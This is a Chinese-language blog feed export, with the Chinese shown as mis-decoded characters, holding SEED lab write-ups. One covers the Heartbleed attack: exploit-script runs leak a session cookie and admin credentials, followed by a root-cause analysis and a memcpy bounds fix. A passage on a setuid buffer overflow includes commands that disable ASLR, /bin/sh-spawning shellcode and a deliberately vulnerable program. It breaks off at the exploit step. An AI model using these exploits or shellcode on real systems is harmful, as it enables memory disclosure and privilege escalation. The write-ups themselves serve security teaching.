å®ƒä»¬æ¥è‡ªæœåŠ¡å™¨çš„ç§æœ‰å†…å­˜ï¼Œå¹¶ä¸”å®ƒä»¬å¯èƒ½åŒ…å«å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€å¯†é’¥å’Œå¯†ç </strong></p><h1 id="Task-1-Launch-the-Heartbleed-Attack"><a href="#Task-1-Launch-the-Heartbleed-Attack" class="headerlink" title="Task 1: Launch the Heartbleed Attack"></a>Task 1: Launch the Heartbleed Attack</h1><p>æ”»å‡»æ­¥éª¤ï¼š</p><ul><li><p>è®¿é—® <a href="https://www.heartbleedlabelgg.com/">https://www.heartbleedlabelgg.com</a></p></li><li><p>ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ï¼šadmin ï¼šseedelgg</p></li><li><p>æ·»åŠ bobyä¸ºfriendï¼Œå¹¶ç»™ä»–å‘é€ç§äººä¿¡æ¯</p></li></ul><p>å¤šæ¬¡è¿è¡Œæ”»å‡»çš„å›æ˜¾å¦‚ä¸‹</p><p>å¯ä»¥çœ‹å‡ºæ³„éœ²äº†cookieã€usernameã€å¯†ç ç­‰å…³é”®ä¿¡æ¯</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs clean"># ./attack.py www.heartbleedlabelgg.com<br><br>defribulator v1<span class="hljs-number">.20</span><br>A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE<span class="hljs-number">-2014</span><span class="hljs-number">-0160</span>)<br><br>##################################################################<br>Connecting to: www.heartbleedlabelgg.com:<span class="hljs-number">443</span>, <span class="hljs-number">1</span> times<br>Sending Client Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Analyze the result....<br>Received Server Hello for TLSv1<span class="hljs-number">.0</span><br>Analyze the result....<br><br>WARNING: www.heartbleedlabelgg.com:<span class="hljs-number">443</span> returned more data than it should - server is vulnerable!<br>Please wait... connection attempt <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span><br>##################################################################<br><br>.@.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...<br>...!<span class="hljs-number">.9</span><span class="hljs-number">.8</span>........<span class="hljs-number">.5</span>...............<br>........<span class="hljs-number">.3</span><span class="hljs-number">.2</span>.....E.D...../...A.................................I.........<br>...........<br>...................................#.......-US,en;q=<span class="hljs-number">0.5</span><br>Accept-Encoding: gzip, deflate<br>Referer: https:<span class="hljs-comment">//www.heartbleedlabelgg.com/profile/boby</span><br>Cookie: Elgg=vt3bsst6tb3ov6njhj7kcijn42<br>Connection: keep-alive<br>If-None-Match: <span class="hljs-string">&quot;1449721729&quot;</span><br><br>..*.......a<span class="hljs-number">.3</span>v.O.akf.........b3ov6njhj7kcijn42<br>Connection: keep-alive<br><br>_..@?.<br>.<span class="hljs-number">.2</span>....&#123; d..................=<span class="hljs-number">1670072367</span>&amp;username=admin&amp;password=seedlggT.;<span class="hljs-number">.8</span>A.K..VY.<span class="hljs-string">&quot;....&quot;</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability"><a href="#Task-2-Find-the-Cause-of-the-Heartbleed-Vulnerability" class="headerlink" title="Task 2: Find the Cause of the Heartbleed Vulnerability"></a>Task 2: Find the Cause of the Heartbleed Vulnerability</h1><p>æ¯”è¾ƒè‰¯æ€§æ•°æ®åŒ…å’Œæ”»å‡»è€…ä»£ç å‘é€çš„æ¶æ„æ•°æ®åŒ…çš„ç»“æœï¼Œä»¥æ‰¾å‡ºå¿ƒè„å‡ºè¡€æ¼æ´çš„æ ¹æœ¬åŸå› </p><blockquote><p>å½“ Heartbeat è¯·æ±‚æ•°æ®åŒ…åˆ°æ¥æ—¶ï¼ŒæœåŠ¡å™¨å°†è§£ææ•°æ®åŒ…ä»¥è·å¾—æœ‰æ•ˆè´Ÿè½½å’Œæœ‰æ•ˆè´Ÿè½½é•¿åº¦å€¼(å¦‚å›¾1æ‰€ç¤º)ã€‚è¿™é‡Œï¼Œæœ‰æ•ˆè´Ÿè½½åªæ˜¯ä¸€ä¸ª3å­—èŠ‚çš„å­—ç¬¦ä¸²â€œ ABCâ€ï¼Œæœ‰æ•ˆè´Ÿè½½é•¿åº¦å€¼æ­£å¥½æ˜¯3ã€‚æœåŠ¡å™¨ç¨‹åºå°†ç›²ç›®åœ°ä»è¯·æ±‚æ•°æ®åŒ…ä¸­è·å–è¿™ä¸ªé•¿åº¦å€¼ã€‚ç„¶åï¼Œå®ƒé€šè¿‡æŒ‡å‘å­˜å‚¨â€œ ABCâ€çš„å†…å­˜å¹¶å°†è´Ÿè½½é•¿åº¦å­—èŠ‚å¤åˆ¶åˆ°å“åº”è´Ÿè½½æ¥æ„å»ºå“åº”æ•°æ®åŒ…ã€‚è¿™æ ·ï¼Œå“åº”æ•°æ®åŒ…å°†åŒ…å«ä¸€ä¸ª3å­—èŠ‚çš„å­—ç¬¦ä¸²â€œ ABCâ€ã€‚æˆ‘ä»¬å¯ä»¥å¯åŠ¨ HeartBleed æ”»å‡»ï¼Œå°†æœ‰æ•ˆè´Ÿè½½é•¿åº¦å­—æ®µè®¾ç½®ä¸º1003ã€‚åœ¨æ„å»ºå“åº”æ•°æ®åŒ…æ—¶ï¼ŒæœåŠ¡å™¨å°†å†æ¬¡ç›²ç›®åœ°é‡‡ç”¨è¿™ä¸ª Payload é•¿åº¦å€¼ã€‚è¿™ä¸€æ¬¡ï¼ŒæœåŠ¡å™¨ç¨‹åºå°†æŒ‡å‘å­—ç¬¦ä¸²â€œ ABCâ€ï¼Œå¹¶å°†1003å­—èŠ‚ä½œä¸ºæœ‰æ•ˆè´Ÿè½½ä»å†…å­˜å¤åˆ¶åˆ°å“åº”æ•°æ®åŒ…ã€‚é™¤äº†å­—ç¬¦ä¸²â€œ ABCâ€ä¹‹å¤–ï¼Œé¢å¤–çš„1000å­—èŠ‚è¢«å¤åˆ¶åˆ°å“åº”æ•°æ®åŒ…ä¸­ï¼Œè¿™äº›æ•°æ®åŒ…å¯ä»¥æ˜¯å†…å­˜ä¸­çš„ä»»ä½•å†…å®¹ï¼Œæ¯”å¦‚æœºå¯†æ´»åŠ¨ã€æ—¥å¿—ä¿¡æ¯ã€å¯†ç ç­‰ç­‰</p></blockquote><p>å›¾ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Heartbleed%20Attack%20Communication.png"></p><p>â€‹             </p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/image/The%20Benign%20Heartbeat%20Communication.png"></p><p>é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æ§åˆ¶æœ‰æ•ˆè½½è·é•¿åº¦å€¼ï¼Œè¯¥å‚æ•°é»˜è®¤æ˜¯0x4000</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> -l <span class="hljs-number">0</span>x015B<br>$./attack<span class="hljs-selector-class">.py</span> www<span class="hljs-selector-class">.heartbleedlabelgg</span><span class="hljs-selector-class">.com</span> --length <span class="hljs-number">83</span><br></code></pre></td></tr></table></figure><p>Question 2.1: As the length variable decreases, what kind of difference can you observe?</p><p>å›è¿”çš„ä¿¡æ¯é•¿åº¦å‡å°‘</p><p>Question 2.2: As the length variable decreases, there is a boundary value for the input length vari-<br>able. At or below that boundary, the Heartbeat query will receive a response packet without attaching<br>any extra data (which means the request is benign). Please find that boundary length. You may need<br>to try many different length values until the web server sends back the reply without extra data. To<br>help you with this, when the number of returned bytes is smaller than the expected length, the pro-<br>gram will print â€œServer processed malformed Heartbeat, but did not return<br>any extra data.â€</p><p>è¾¹ç•Œå€¼ï¼š22</p><p>å›æ˜¾å½¢å¼1ï¼š</p><blockquote><p>WARNING: <a href="http://www.heartbleedlabelgg.com:443/">www.heartbleedlabelgg.com:443</a> returned more data than it should - server is vulnerable!</p></blockquote><p>å›æ˜¾å½¢å¼2ï¼š</p><blockquote><p>Server processed malformed heartbeat, but did not return any extra data.</p></blockquote><h1 id="Task-3-Countermeasure-and-Bug-Fix"><a href="#Task-3-Countermeasure-and-Bug-Fix" class="headerlink" title="Task 3: Countermeasure and Bug Fix"></a>Task 3: Countermeasure and Bug Fix</h1><p>ä½¿ç”¨<code>sudo apt-get update</code>å°† OpenSSL åº“æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå‘ç°ä¹‹åçš„æ”»å‡»æ— æ•ˆ</p><p>Heartbeat request/response åŒ…æ ¼å¼å¦‚ä¸‹ï¼š</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    HeartbeatMessageType type; <span class="hljs-comment">// 1 byte: request or the response</span><br>    uint16 payload_length; <span class="hljs-comment">// 2 byte: the length of the payload</span><br>    opaque payload[HeartbeatMessage.payload_length];<br>    opaque padding[padding_length];<br>&#125; HeartbeatMessage;<br></code></pre></td></tr></table></figure><ul><li><p>typeæ˜¯ç±»å‹ä¿¡æ¯</p></li><li><p>payload_lengthæ˜¯æœ‰æ•ˆè´Ÿè½½é•¿åº¦</p></li><li><p>payloadæ˜¯å®é™…çš„æœ‰æ•ˆè´Ÿè½½</p></li><li><p>å¡«å……å­—æ®µ</p></li></ul><blockquote><p>æœ‰æ•ˆè´Ÿè½½çš„å¤§å°åº”è¯¥ä¸æœ‰æ•ˆè´Ÿè½½é•¿åº¦å­—æ®µä¸­çš„å€¼ç›¸åŒï¼Œä½†æ˜¯åœ¨æ”»å‡»åœºæ™¯ä¸­ï¼Œæœ‰æ•ˆè´Ÿè½½é•¿åº¦å¯ä»¥è®¾ç½®ä¸ºä¸åŒçš„å€¼</p></blockquote><p>å¯¼è‡´bugçš„è¯­å¥æ˜¯<code>memcpy(bp, pl, payload); </code>ï¼Œå…¶ä¸­ï¼ŒbpæŒ‡å‘bufferï¼ŒplæŒ‡å‘payloadï¼Œå®ƒä¼šå°†payloadé•¿åº¦çš„å†…å®¹ä»plå¤åˆ¶åˆ°bpï¼ˆæ­£å¦‚Aliceæ‰€è¯´ï¼‰ï¼Œè€Œè¿™å¹¶æ²¡æœ‰åšè¾¹ç•Œæ£€æŸ¥</p><p>åœ¨memcpyä¹‹å‰åŠ ä¸Šä»¥ä¸‹è¯­å¥ä»¥ä¿®è®¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">payload = payload_length &gt; <span class="hljs-built_in">strlen</span>(pl) ? <span class="hljs-built_in">strlen</span>(pl) : payload_length ;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šBuffer-Overflow Attack Lab ï¼ˆ16.04è™šæ‹Ÿæœºï¼‰</title>
    <link href="/p/187136b6/"/>
    <url>/p/187136b6/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><p>Linuxæœ‰ä¸¤ä¸ªé˜²å¾¡æœºåˆ¶ï¼š</p><ul><li>/bin/shç¬¦å·é“¾æ¥æŒ‡å‘çš„æ˜¯/bin/dashï¼Œdashå’Œbashéƒ½æœ‰é˜²å¾¡æœºåˆ¶ï¼Œå½“å®ƒä»¬å‘ç°è‡ªå·±æ˜¯åœ¨setuidè¿›ç¨‹ä¸­è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šeuidä¸ºè¿›ç¨‹çš„çœŸå®ç”¨æˆ·idï¼Œæ”¾å¼ƒç‰¹æƒ</li><li>åœ°å€ç©ºé—´éšæœºåŒ–ï¼šLinux ä½¿ç”¨åœ°å€ç©ºé—´éšæœºåŒ–æ¥éšæœºåŒ–å †å’Œå †æ ˆçš„èµ·å§‹åœ°å€</li></ul><p>ä¸ºäº†æ­£å¸¸è¿›è¡Œå®éªŒï¼Œéœ€è¦ï¼š</p><ul><li>å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–</li><li>å°†/bin/shç¬¦å·é“¾æ¥æŒ‡å‘æ²¡æœ‰ä¿æŠ¤çš„shellï¼Œæ¯”å¦‚zsh</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br><br>sudo sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>shellcodeï¼š</p><ul><li>shellcodeæœ¬è´¨æ˜¯å¯åŠ¨shellçš„ä»£ç ï¼Œä¸€èˆ¬æ˜¯äºŒè¿›åˆ¶å½¢å¼</li><li>éœ€è¦è¢«è£…è½½åˆ°å†…å­˜ä¸­ä»è€Œå¯ä»¥ä½¿å¾—æ¶æ„ç¨‹åºè·³è½¬åˆ°shellcodeä»£ç æ‰€åœ¨ä½ç½®</li></ul><p>Cè¯­è¨€ç‰ˆæœ¬çš„shellcodeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    execve(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ç¨‹åºå¯¹åº”çš„äºŒè¿›åˆ¶å½¢å¼è¢«å†™åœ¨äº†codeæ•°ç»„ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* call_shellcode.c  */</span><br><br><span class="hljs-comment">/*A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> code[] =<br>  <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>  <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   %ebx                   */</span><br>  <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>  <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>  <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>  <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-keyword">char</span> buf[<span class="hljs-keyword">sizeof</span>(code)];<br>   <span class="hljs-built_in">strcpy</span>(buf, code);<br>   ((<span class="hljs-keyword">void</span>(*)( ))buf)( );<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹<code> ((void(*)( ))buf)( );</code></p><p>å¯¹äºè¿™ç§å¤æ‚æŒ‡é’ˆé—®é¢˜ï¼Œæˆ‘ä»¬ç¥­å‡ºå°å­¦äº”å¹´çº§å­¦è¿‡çš„<code>å³å·¦æ³•åˆ™</code>ï¼š</p><ul><li>å…ˆçœ‹æœ€é‡Œé¢çš„æ‹¬å·ï¼Œå†çœ‹å³è¾¹ï¼Œå†çœ‹å·¦è¾¹</li><li>æ¯å½“ä½ é‡åˆ°æ‹¬å·ï¼Œä½ åº”è¯¥æ”¹å˜ä½ çš„é˜…è¯»æ–¹å‘</li><li>è§£æå®Œæ‹¬å·å†…çš„æ‰€æœ‰å†…å®¹åï¼Œè·³å‡ºæ‹¬å·</li><li>é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´åˆ°è§£å†³æ•´ä¸ªè¯­å¥</li></ul><blockquote><p>Right-Left Rule: First look at the innermost parenthesis, then look to the right, and then to the left. Whenever you encounter parentheses, you should switch your reading direction. Once you have parsed everything inside the parentheses, jump out of the parentheses. Repeat this process until the entire statement is resolved.</p><p>referenceï¼š<a href="https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598">https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598</a></p></blockquote><p>å› æ­¤æœ€é‡Œé¢çš„å†…å®¹å¯ä»¥æå–ä¸ºï¼š<code>void(*)( )</code>ï¼Œä¹Ÿå³æ˜¯<code>void(* foo)( )</code></p><p>fooä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼Œè¿”å›å€¼æ˜¯voidç±»å‹</p><p>ä¹‹åå‘å¤–çœ‹ï¼Œbufè¢«å¼ºè½¬ä¸ºä¸Šé¢çš„æŒ‡é’ˆç±»å‹ï¼Œè¿™é‡Œè¿›è¡Œäº†è°ƒç”¨ï¼Œä¹Ÿå³æ˜¯æ‰§è¡Œäº†äºŒè¿›åˆ¶ä»£ç </p><p>å†è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆå°†â€œ//shâ€è€Œä¸æ˜¯â€œ/shâ€æ¨å…¥å †æ ˆã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦32 bitï¼Œè€Œâ€œ/shâ€åªæœ‰24ä½ï¼Œè¦æ³¨æ„åˆ°â€œ//â€ç­‰æ•ˆäºâ€œ/â€ï¼Œä¸ä¿¡ä½ å¯ä»¥è¯•è¯•åœ¨å‘½ä»¤è¡Œæ•²å…¥<code>/bin//sh</code>ä¹Ÿæ˜¯å¯ä»¥å¼€å¯shellè¿›ç¨‹çš„</p><p>ä½¿ç”¨call_shellcode.cå¾—åˆ°root shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ln -sf /bin/zsh /bin/sh<br><br>gcc -z execstack -o call_shellcode call_shellcode.c<br><br>sudo chown root call_shellcode<br><br>sudo chmod 4755 call_shellcode<br><br>./call_shellcode<br></code></pre></td></tr></table></figure><h1 id="The-Vulnerable-Program"><a href="#The-Vulnerable-Program" class="headerlink" title="The Vulnerable Program"></a>The Vulnerable Program</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Vunlerable program: stack.c */</span><br><span class="hljs-comment">/* You can get this program from the lab&#x27;s website */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 0 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 24</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>     <span class="hljs-comment">/* Change the size of the dummy array to randomize the parameters</span><br><span class="hljs-comment">       for this lab. Need to use the array at least once */</span><br>    <span class="hljs-keyword">char</span> dummy[BUF_SIZE];  <span class="hljs-built_in">memset</span>(dummy, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">517</span>, badfile);<br>    bof(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»é¢ï¼š</strong></p><p>è¯¥ç¨‹åºä»ä¸€ä¸ªåä¸º badfile çš„æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åå°†è¯¥è¾“å…¥ä¼ é€’ç»™å‡½æ•° bof ()ä¸­çš„å¦ä¸€ä¸ªç¼“å†²åŒºã€‚åŸå§‹è¾“å…¥çš„æœ€å¤§é•¿åº¦å¯ä»¥æ˜¯517å­—èŠ‚ï¼Œä½†æ˜¯ bof ()ä¸­çš„ç¼“å†²åŒºåªæœ‰ BUF SIZE å­—èŠ‚ï¼Œä¹Ÿå³æ˜¯24é•¿ï¼Œå°äº517ã€‚å› ä¸º strcpy ()ä¸æ£€æŸ¥è¾¹ç•Œï¼Œæ‰€ä»¥ä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‚ç”±äºè¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ª root ç”¨æˆ·æ‹¥æœ‰çš„ Set-UID ç¨‹åºï¼Œå¦‚æœæ™®é€šç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œé‚£ä¹ˆç”¨æˆ·å¯èƒ½ä¼šå¾—åˆ°ä¸€ä¸ª root shellã€‚åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºä»ä¸€ä¸ªåä¸º badfile çš„æ–‡ä»¶ä¸­è·å–è¾“å…¥ã€‚æ­¤æ–‡ä»¶ç”±ç”¨æˆ·æ§åˆ¶ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¸º badfile åˆ›å»ºå†…å®¹ï¼Œè¿™æ ·å½“æ˜“å—æ”»å‡»çš„ç¨‹åºå°†å†…å®¹å¤åˆ¶åˆ°å…¶ç¼“å†²åŒºæ—¶ï¼Œå°±å¯ä»¥äº§ç”Ÿä¸€ä¸ªroot shellã€‚</p><p><strong>ç¼–è¯‘ï¼š</strong></p><ul><li><p>é¦–å…ˆå°†ç¨‹åºçš„æ‰€æœ‰æƒæ›´æ”¹ä¸º root</p></li><li><p>ç„¶åå°†æƒé™æ›´æ”¹ä¸º4755ä»¥å¯ç”¨ Set-UID </p></li><li><p>æ›´æ”¹æ‰€æœ‰æƒå¿…é¡»åœ¨æ‰“å¼€ Set-UID ä½ä¹‹å‰å®Œæˆï¼Œå› ä¸ºæ‰€æœ‰æƒæ›´æ”¹å°†å¯¼è‡´å…³é—­ Set-UID ä½</p></li><li><p>ä½¿ç”¨-fno-stack-protected å’Œâ€œ-z Execstackâ€é€‰é¡¹å…³é—­ StackGuard å’Œéå¯æ‰§è¡Œå †æ ˆä¿æŠ¤</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Note: N should be replaced by the value set by the instructor</span><br>$ gcc -g -o stack -z execstack -fno-stack-protector stack.c<br>$ sudo chown root stack <br>$ sudo chmod <span class="hljs-number">4755</span> stack <br></code></pre></td></tr></table></figure><h1 id="Task-2-Exploiting-the-Vulnerability"><a href="#Task-2-Exploiting-the-Vulnerability" class="headerlink" title="Task 2: Exploiting the Vulnerability"></a>Task 2: Exploiting the Vulnerability</h1><p>æˆ‘ä»¬éœ€è¦ç¼–å†™exploit.cï¼Œè¯¥ä»£ç å¯ä»¥å¡«å†™badfileçš„å†…å®¹ä»è€Œå¼•å‘æ”»å‡»ã€‚ä¸ºäº†å‘èµ·æ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨gdbè°ƒè¯•stackæ–‡ä»¶</p><p>ç¼–è¯‘stack.cï¼š</p><ul><li><p>åœ¨ä¸Šé¢ç¼–è¯‘é€‰é¡¹çš„åŸºç¡€ä¸ŠåŠ ä¸Š-gé€‰é¡¹ï¼Œç¼–è¯‘stack.cï¼Œä¹Ÿå³æ˜¯<code>gcc -g -o stack -z execstack -fno-stack-protector 